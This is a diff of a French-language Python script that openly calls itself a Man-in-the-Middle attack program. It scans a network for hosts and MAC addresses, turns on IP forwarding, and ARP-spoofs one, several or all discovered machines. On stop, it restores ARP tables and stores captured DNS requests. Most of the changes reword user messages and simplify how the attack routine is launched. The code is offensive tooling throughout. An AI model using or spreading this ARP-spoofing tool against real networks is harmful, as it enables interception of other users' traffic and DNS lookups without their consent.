@@ -20,17 +20,17 @@ def attaque():
 today = date.today()
 date = today.strftime("%d %B %y")
 
-print("===Bienvenue dans ce programme d'attaque Man In The Middle===\nvous avez plusieurs choix :\n1:Vous souhaiter scannée le reseau afin de trouver des adresses ip disponible. \n2:Vous connaissez deja l'adresse ip de la cible. ")
+print("===Bienvenue dans ce programme d'attaque Man In The Middle===\nvous avez plusieurs choix :\n1:Vous souhaitez scanner le reseau afin de trouver des adresses IP disponibles. \n2:Vous connaissez deja l'adresse ip de la cible. ")
 user_choice= input("Saisissez votre choix: ")
 
 
 if user_choice == "1" :
 
 # on scan le réseau la reseau d'adresse ip disponible
-	plage_ip=input("\nSaisissez la plage d'adresse ip a scanné: ")
+	plage_ip=input("\nSaisissez la plage d'adresse ip a scanner: ")
 
 	print("-------------------")
-	print("vous avez choisi de scaner cette plage ip : {}".format(plage_ip))
+	print("vous avez choisi de scanner cette plage d'adresse IP : {}".format(plage_ip))
 
 	list_IP=scan_ip(plage_ip)
 	data_plageIP = []
@@ -39,16 +39,16 @@ if user_choice == "1" :
 	
 
 	for ip in list_IP :
-		print("voici les adresses ip disponible : {0}" .format(ip))
+		print("voici les adresses IP disponibles : {0}" .format(ip))
 		print("--------------")
 
-	print("\nNous allons recuperer les adresses mac qui correspondent aux ip trouver")
+	print("\nNous allons recuperer les adresses MAC qui correspondent aux  adresses IP trouvées ")
 	print("------------------")
-	scan_mac=scan_Mac(list_IP)
 
+	scan_mac=scan_Mac(list_IP)
 	data_ip_active= get_Ip_Active(list_IP)
 
-	insert_data(data_plageIP,data_ip_active)
+	
 	
 
 	
@@ -66,8 +66,8 @@ routerMac=recup_mac_adress(MacRouter)
 
  
 
-print("nous allons passer au spoofing ARP ")
-user_choice1=input("1: Vous voulez spoofer 1 seul IP.\n2: Vous voulais spoofer plusieurs IP.\n3: vous souhaiter spoofer toute les adresses IP trouver.\nSaisissez votre choix: ")
+print("Nous allons passer au spoofing ARP ")
+user_choice1=input("1: Vous voulez spoofer 1 seul IP.\n2: Vous voulez spoofer plusieurs IP.\n3: vous souhaiter spoofer toute les adresses IP trouvé.\nSaisissez votre choix: ")
 
 os.system("echo 1 >/proc/sys/net/ipv4/ip_forward")
 
@@ -83,16 +83,16 @@ if user_choice1 == "1":
 	
 		targetMac=recup_mac_adress(scan_mac)
 
-		Thread(target=attaque).start()
-		time.sleep(5)
-		Thread(target=dns_spoof).start()
+		attaque()
 	
 
 
 	except KeyboardInterrupt:
 
-		print("\nwe going to stop the man in the middle attack")
+		print("\nNous allons stopper l'attaque Man in the middle")
 		stop = reARP(target_ip,routerIP, routerMac, targetMac)
+		list_dns_request = recup_dns()
+		insert_data(data_plageIP,data_ip_active,list_dns_request)
 
 elif user_choice1 == "2":
 
@@ -118,7 +118,7 @@ elif user_choice1 == "2":
 	except KeyboardInterrupt:
 
 		for ip, mac in scan_mac.items():
-			print("\nwe going to stop the man in the middle attack  ")
+			print("\nNous allons stopper l'attaque Man in the middle")
 			reARP(ip,routerIP, routerMac, mac)
 
 
@@ -137,7 +137,7 @@ elif user_choice1 == "3" :
 	except KeyboardInterrupt:
 
 		for ip, mac in scan_mac.items(): 	
-			print("\nwe going to stop the man in the middle attack  ")
+			print("\nNous allons stopper l'attaque Man in the middle")
 			reARP(ip,routerIP, routerMac, mac)
 
 
